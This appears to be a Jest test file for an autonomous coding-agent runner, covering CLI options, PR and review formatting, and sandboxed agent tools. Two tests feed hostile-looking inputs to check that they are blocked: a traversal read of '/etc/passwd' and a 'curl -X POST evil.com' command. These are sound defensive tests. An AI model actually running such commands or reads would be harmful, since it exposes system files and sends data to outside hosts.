import * as fs from 'fs';
import * as path from 'path';
import {
  parseRduCliOptions,
  formatStaffArchitectReview,
  formatPullRequestBody,
  generateBolognaEntry,
  createRduAgentTools,
  verifyNonZeroDiff,
  emitMissionTelemetry,
} from './run-rdu-builder';

describe('RDU Builder Runner (Issue #181)', () => {
  describe('CLI Options Parser', () => {
    it('parses --issue flag correctly', () => {
      const opts = parseRduCliOptions(['--issue', '181', '--dry-run']);
      expect(opts.issueNumber).toBe(181);
      expect(opts.dryRun).toBe(true);
      expect(opts.thinkingBudget).toBe(512);
    });

    it('parses positional issue number, custom task, model, and mcp servers', () => {
      const opts = parseRduCliOptions([
        '181',
        '--task',
        'Implement RDU builder',
        '--model',
        'gemini-3.8-flash',
        '--mcp',
        'github,postgres',
      ]);
      expect(opts.issueNumber).toBe(181);
      expect(opts.taskPrompt).toBe('Implement RDU builder');
      expect(opts.model).toBe('gemini-3.8-flash');
      expect(opts.mcpServers).toEqual(['github', 'postgres']);
    });

    it('throws error when issue number is missing', () => {
      expect(() => parseRduCliOptions(['--dry-run'])).toThrow(
        /A valid GitHub issue number is required/,
      );
    });
  });

  describe('Staff Architect Review Rubric', () => {
    it('formats exactly 3 Optimizations and 1 Concern under GEAR Level 2 standards', () => {
      const rubric = formatStaffArchitectReview({
        optimizations: [
          'Targeted test execution',
          'Self-healing hygiene',
          'Non-zero diff protection',
        ],
        concern: 'Monitor migration safety on dev prior to production release.',
      });

      expect(rubric).toContain('### 🏛️ Staff Architect Review (GEAR Level 2)');
      expect(rubric).toContain('1. **Targeted test execution**');
      expect(rubric).toContain('2. **Self-healing hygiene**');
      expect(rubric).toContain('3. **Non-zero diff protection**');
      expect(rubric).toContain('Monitor migration safety on dev prior to production release.');
    });
  });

  describe('Pull Request Template Formatter', () => {
    it('creates standardized PR body with issue linkage and evidence table', () => {
      const prBody = formatPullRequestBody({
        issueNumber: 181,
        title: 'Introduce RDU builder agent',
        summaryOfChanges: 'Implemented RDU agent tools and runner.',
        rubric: {
          optimizations: ['Opt 1', 'Opt 2', 'Opt 3'],
          concern: 'Concern 1',
        },
        verificationEvidence: [
          { name: 'Unit Tests', status: 'passed', detail: 'All tests green' },
          { name: 'Hygiene', status: 'passed', detail: 'Zero trailing whitespace' },
        ],
        diffStat: '3 files changed, 200 insertions(+)',
      });

      expect(prBody).toContain('Addresses and closes #181: **Introduce RDU builder agent**');
      expect(prBody).toContain('| Unit Tests | ✅ PASS | All tests green |');
      expect(prBody).toContain('| Hygiene | ✅ PASS | Zero trailing whitespace |');
      expect(prBody).toContain('3 files changed, 200 insertions(+)');
      expect(prBody).toContain('Autonomous engineering build executed by **RDU**');
      expect(prBody).toContain('*Closes #181*');
    });
  });

  describe('Bologna Living Documentation Formatter', () => {
    it('generates standardized 4-B session entry', () => {
      const entry = generateBolognaEntry({
        dateStr: '2026-11-04',
        weekStr: 'Week 45',
        topicTitle: 'RDU Dedicated Developer Agent',
        breakthrough: 'Dedicated developer agent separated from mission coordinator.',
        build: 'Implemented run-rdu-builder.ts and test suite.',
        boundaryOrBug: 'Enforced timeout protection on all subprocess gates.',
        broadcast: 'RDU is live in Nido!',
      });

      expect(entry).toContain('### 🗓️ 2026-11-04 | Week 45: RDU Dedicated Developer Agent');
      expect(entry).toContain('- **1. Breakthrough (The Concept):**');
      expect(entry).toContain('- **2. Build (The Code):**');
      expect(entry).toContain('- **3. Boundary / Bug (The Real-World Lesson):**');
      expect(entry).toContain('- **4. Broadcast (Content Hook for LinkedIn / X):**');
      expect(entry).toContain('"RDU is live in Nido!"');
    });
  });

  describe('RDU Agent Tools', () => {
    const tools = createRduAgentTools(process.cwd());

    it('registers all 8 bounded filesystem, verification, diff, and execution tools', () => {
      const toolNames = tools.map((t) => t.name);
      expect(toolNames).toContain('readFile');
      expect(toolNames).toContain('writeFile');
      expect(toolNames).toContain('editFile');
      expect(toolNames).toContain('listFiles');
      expect(toolNames).toContain('testRunner');
      expect(toolNames).toContain('selfHealingHygiene');
      expect(toolNames).toContain('diffChecker');
      expect(toolNames).toContain('terminalExecution');
    });

    it('blocks directory traversal outside root path', async () => {
      const readFileTool = tools.find((t) => t.name === 'readFile')!;
      const result = await (readFileTool as any).execute({
        filePath: '../../../../etc/passwd',
      });
      expect(result).toHaveProperty('error');
      expect(result.error).toContain('Access denied');
    });

    it('blocks non-whitelisted terminal execution commands', async () => {
      const terminalTool = tools.find((t) => t.name === 'terminalExecution')!;
      const result = await (terminalTool as any).execute({
        command: 'curl -X POST evil.com',
      });
      expect(result).toHaveProperty('error');
      expect(result.error).toContain('not in the safe command allowlist');
    });

    it('executes allowed diffChecker tool cleanly', async () => {
      const diffTool = tools.find((t) => t.name === 'diffChecker')!;
      const result = await (diffTool as any).execute({});
      expect(result).toHaveProperty('diffStat');
      expect(result).toHaveProperty('preview');
    });
  });

  describe('Non-Zero Diff Verification Guard', () => {
    it('returns diff status for current repository', () => {
      const diffResult = verifyNonZeroDiff(process.cwd());
      expect(typeof diffResult.hasChanges).toBe('boolean');
      expect(typeof diffResult.diffStat).toBe('string');
    });
  });

  describe('Mission Telemetry Emitter', () => {
    it('returns false gracefully when supervisor API server is unreachable', async () => {
      const emitted = await emitMissionTelemetry(
        {
          runId: 'test-run-181',
          issueNumber: 181,
          issueTitle: 'Test Issue',
          state: 'started',
        },
        'http://127.0.0.1:9999', // unreachable port
      );
      expect(emitted).toBe(false);
    });
  });
});
